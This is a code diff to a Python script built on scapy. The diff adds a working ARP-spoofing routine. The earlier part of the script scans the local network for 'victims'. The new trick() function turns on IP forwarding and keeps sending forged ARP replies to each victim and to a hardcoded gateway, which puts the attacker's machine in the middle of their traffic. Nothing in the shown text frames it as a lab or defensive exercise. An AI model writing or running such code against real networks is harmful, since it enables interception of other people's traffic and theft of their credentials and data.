@@ -2,9 +2,12 @@ import ipaddress
 import netifaces
 import scapy.all as scapy
 import threading
+import os
+import time
+from queue import Queue
 
-lock = threading.Lock()
-IPS = list()
+GATEWAY_IP = '10.6.0.254'
+IPS: Queue = Queue()
 
 
 def get_mac(ip: str):
@@ -24,10 +27,7 @@ def alive(ip: str) -> bool:
     if mac is None:
         return False
     print(f'{ip}\t{get_mac(ip)}')
-    lock.acquire()
-    IPS.append(ip)
-    lock.release()
-
+    IPS.put(ip)
     return True
 
 
@@ -52,4 +52,20 @@ def get_victims() -> list:
     for t in threads:
         t.join()
     print(f'--------------------------------------------------')
-    return IPS
+    return list(IPS.queue)
+
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip,
+                       hwdst=get_mac(target_ip),
+                       psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+def trick(victim_ips: str):
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    while True:
+        for victim_ip in victim_ips:
+            spoof(victim_ip, GATEWAY_IP)
+            spoof(GATEWAY_IP, victim_ip)
+        time.sleep(10)
